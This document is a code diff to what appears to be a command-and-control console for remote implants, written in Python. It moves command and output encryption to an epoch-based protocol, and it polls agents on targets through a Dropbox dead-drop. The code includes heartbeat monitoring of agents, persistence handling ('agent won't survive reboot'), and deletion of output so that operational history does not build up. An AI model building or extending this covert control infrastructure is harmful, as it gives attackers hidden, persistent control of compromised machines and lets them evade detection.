@@ -20,7 +20,7 @@ from providers._session import (
     DOWNLOADS_DIR, RateLimitedError,
     _sync_persist_check, _sync_persist_probe, _sync_persist_op,
 )
-from providers._crypto import encrypt_command, decrypt_output, build_task
+from providers._crypto import build_task
 
 
 def _parse_heartbeat(text: str) -> dict:
@@ -94,15 +94,19 @@ class HeartbeatMonitor(threading.Thread):
             sess.state.update(state="offline", key_mismatch=False)
             return
 
-        text = raw.decode("utf-8", errors="replace").strip()
-        if text.startswith("KM:"):
-            sess.state.update(state="offline", key_mismatch=True)
-            return
-
-        dec = decrypt_output(text, sess.private_key_file, sess.key_password)
+        from providers._epoch import decrypt_message_v2 as _dec_v2
+        epoch_st = sess.get_epoch_state()
+        if epoch_st is None:
+            epoch_st = self._bootstrap_server_epoch(sess, raw)
+            if epoch_st is None:
+                sess.state.update(state="offline", key_mismatch=True)
+                return
+        agent_id = sess.derive_agent_id()
+        dec = _dec_v2(raw, epoch_st, agent_id)
         if dec is None:
             sess.state.update(state="offline", key_mismatch=True)
             return
+        sess.save_epoch_state(epoch_st)
 
         hb  = _parse_heartbeat(dec)
         now = time.time()
@@ -207,19 +211,49 @@ class HeartbeatMonitor(threading.Thread):
                 _n_warn(f"[{sess.id}] Blob not saved on target — agent won't survive reboot/restart  (tried: {_blob_tried})  (use /blobsave to fix)")
 
 
+    def _bootstrap_server_epoch(self, sess, raw: bytes):
+        from providers._epoch import (
+            bootstrap_epoch_server, EpochState as _EpochState,
+        )
+        import struct as _struct
+        if len(raw) < 37:
+            return None
+        agent_eph_pub = raw[5:37]
+        privs_hex = sess.profile.prekey_privs_hex
+        if not privs_hex:
+            return None
+        privs_bytes = bytes.fromhex(privs_hex)
+        session_key = bytes.fromhex(sess.profile.session_key)
+        agent_id = sess.derive_agent_id()
+        for i in range(0, len(privs_bytes), 32):
+            prekey_priv = privs_bytes[i:i + 32]
+            try:
+                st = bootstrap_epoch_server(prekey_priv, agent_eph_pub, session_key, agent_id)
+                from providers._epoch import decrypt_message_v2 as _dec_test
+                test = _dec_test(raw, st, agent_id)
+                if test is not None:
+                    sess.save_epoch_state(st)
+                    return st
+            except Exception:
+                continue
+        return None
+
+
 def _initial_hb_check(sess: Session):
     try:
         raw = sess.transport.download(sess.profile.heartbeat_path)
         if not raw:
             return
-        text = raw.decode("utf-8", errors="replace").strip()
-        if text.startswith("KM:"):
-            sess.state.update(key_mismatch=True)
+        from providers._epoch import decrypt_message_v2 as _dec_v2
+        epoch_st = sess.get_epoch_state()
+        if epoch_st is None:
             return
-        dec = decrypt_output(text, sess.private_key_file, sess.key_password)
+        agent_id = sess.derive_agent_id()
+        dec = _dec_v2(raw, epoch_st, agent_id)
         if dec is None:
             sess.state.update(key_mismatch=True)
             return
+        sess.save_epoch_state(epoch_st)
         hb  = _parse_heartbeat(dec)
         ts  = hb.get("timestamp", "")
         if not ts:
@@ -349,45 +383,41 @@ class AsyncPoller(threading.Thread):
                     self._stop.wait(sess.poll_interval)
                     continue
                 if raw:
-                    text = raw.decode("utf-8", errors="replace").strip()
-                    if text and text != self.baseline and text != MZ_MARKER:
-                        dec = decrypt_output(text, sess.private_key_file, sess.key_password)
-                        if dec is None:
-                            _n_err(f"[{self.cmd_id}] decrypt failed (key mismatch?)")
-                            return
-                        # --- JSON envelope protocol ---
-                        try:
-                            resp = json.loads(dec)
-                        except (json.JSONDecodeError, TypeError):
-                            # Pre-migration agent or corruption: treat as stale
-                            sess.baseline = text
+                    from providers._epoch import decrypt_message_v2 as _dec_v2
+                    _es = sess.get_epoch_state()
+                    dec = _dec_v2(raw, _es, sess.derive_agent_id()) if _es else None
+                    if dec is None:
+                        if raw == MZ_MARKER.encode() or raw == b"MZ":
                             self._stop.wait(sess.poll_interval)
                             continue
+                        _n_err(f"[{self.cmd_id}] decrypt failed")
+                        return
+                    sess.save_epoch_state(_es)
 
-                        if resp.get("id") != self.cmd_id:
-                            # Stale response from a different command
-                            sess.baseline = text
-                            self._stop.wait(sess.poll_interval)
-                            continue
+                    # --- JSON envelope protocol ---
+                    try:
+                        resp = json.loads(dec)
+                    except (json.JSONDecodeError, TypeError):
+                        self._stop.wait(sess.poll_interval)
+                        continue
 
-                        # Verify mutual-auth token — reject responses from agents that
-                        # could not decrypt the task (they never saw the token).
-                        if self.session_token and resp.get("session_token") != self.session_token:
-                            _n_err(f"[{self.cmd_id}] session_token mismatch — response rejected (forged or stale)")
-                            sess.baseline = text
-                            self._stop.wait(sess.poll_interval)
-                            continue
+                    if resp.get("id") != self.cmd_id:
+                        self._stop.wait(sess.poll_interval)
+                        continue
 
-                        # Valid matching response
-                        output       = resp.get("output", "").strip()
-                        cwd          = resp.get("cwd", "")
-                        status       = resp.get("status", "ok")
-                        staging_path = resp.get("staging_path", "")
-                        artifacts    = resp.get("artifacts", [])
+                    if self.session_token and resp.get("session_token") != self.session_token:
+                        _n_err(f"[{self.cmd_id}] session_token mismatch — response rejected (forged or stale)")
+                        self._stop.wait(sess.poll_interval)
+                        continue
 
-                        if cwd:
-                            sess.state.update(remote_cwd=cwd)
-                        sess.baseline = text
+                    output       = resp.get("output", "").strip()
+                    cwd          = resp.get("cwd", "")
+                    status       = resp.get("status", "ok")
+                    staging_path = resp.get("staging_path", "")
+                    artifacts    = resp.get("artifacts", [])
+
+                    if cwd:
+                        sess.state.update(remote_cwd=cwd)
 
                         # HIGH-9: delete output file from cloud after reading — prevent
                         # operational history accumulation on the dead-drop storage.
@@ -519,16 +549,19 @@ def send_async(session: Session, task_json: str, display: str, cmd_id: str = "",
             _n_info("Previous pending command cancelled")
 
     try:
-        payload = encrypt_command(task_json, session.private_key_file, session.session_key_hex,
-                                  session.key_password)
+        from providers._epoch import encrypt_command_v2
+        epoch_st = session.get_epoch_state()
+        if epoch_st is None:
+            _n_err(f"[{cmd_id}] no epoch state — session not bootstrapped")
+            return cmd_id
+        upload_data = encrypt_command_v2(task_json, session.private_key_file, epoch_st,
+                                         session.key_password)
+        session.save_epoch_state(epoch_st)
     except Exception as e:
         _n_err(f"[{cmd_id}] encryption failed: {e}")
         return cmd_id
 
     def _upload_and_start():
-        # Snapshot baseline before upload so the poller knows what "no response yet" looks like.
-        # Done inside the thread (network call) but captured into a local so the AsyncPoller
-        # uses the value current at upload time, not whatever session.baseline is later.
         try:
             cur = session.transport.download(session.profile.output_path)
         except RateLimitedError:
@@ -536,8 +569,8 @@ def send_async(session: Session, task_json: str, display: str, cmd_id: str = "",
         captured_baseline = cur.decode("utf-8", errors="replace").strip() if cur else session.baseline
         session.baseline = captured_baseline
 
-        _n_info(f"[{cmd_id}] uploading to input_path={session.profile.input_path!r} payload_len={len(payload)}")
-        upload_ok = session.transport.upload(session.profile.input_path, payload.encode())
+        _n_info(f"[{cmd_id}] uploading to input_path={session.profile.input_path!r} payload_len={len(upload_data)}")
+        upload_ok = session.transport.upload(session.profile.input_path, upload_data)
         _n_info(f"[{cmd_id}] upload result={upload_ok}")
         # Verify: re-download input immediately after upload to confirm Dropbox has the new content
         import time as _time; _time.sleep(1)
